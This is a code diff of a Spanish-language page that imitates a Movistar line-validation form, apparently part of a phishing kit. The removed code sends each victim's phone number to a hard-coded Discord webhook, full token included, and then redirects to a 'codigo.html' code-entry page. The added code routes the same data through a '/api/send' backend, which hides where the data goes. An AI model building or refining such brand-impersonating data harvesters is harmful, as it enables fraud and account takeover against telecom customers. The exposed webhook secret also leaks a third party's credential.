@@ -199,15 +199,6 @@
       }
     }
   </style>
-   <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17606342725"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17606342725');
-</script>
 </head>
 
 <body>
@@ -233,8 +224,9 @@
             <img
               src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png"
               alt="Teléfono" class="phone-icon" />
-            <input type="text" id="linea" class="form-control line-input" placeholder="Ingresa tu número de línea"
-              required />
+            <input type="tel" id="linea" class="form-control line-input"
+              placeholder="Ingresa tu número de línea"
+              required pattern="[0-9]{10}" inputmode="numeric" />
           </div>
           <small class="form-text text-muted">Ingresa tu número de línea móvil Movistar</small>
         </div>
@@ -275,43 +267,38 @@
 
   <!-- JS -->
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
-
-    function sendToDiscord(message) {
-      const data = { content: message };
-
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-        .then(res => console.log("✅ Enviado a Discord"))
-        .catch(err => console.error("❌ Error enviando a Discord", err));
-    }
-
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const linea = document.getElementById("linea").value.trim();
       if (!linea) return;
 
-      // Loader visible
       const loader = document.getElementById("loader");
       loader.style.display = "flex";
 
-      setTimeout(() => {
+      try {
+        const res = await fetch("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ linea })
+        });
+
+        const json = await res.json();
+        console.log("Respuesta del backend:", json);
+
         loader.style.display = "none";
 
-        const fecha = new Date().toLocaleString("es-CO");
-        const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${fecha}`;
-
-        sendToDiscord(mensaje);
-
-        localStorage.setItem("linea", linea);
-        window.location.href = "codigo.html";
-      }, 2000);
+        if (json.ok) {
+          localStorage.setItem("linea", linea);
+          window.location.href = "codigo.html";
+        } else {
+          alert("❌ Error: " + (json.error || "No se pudo enviar el número"));
+        }
+      } catch (err) {
+        loader.style.display = "none";
+        alert("Error de conexión: " + err.message);
+      }
     });
   </script>
 </body>
-
 </html>
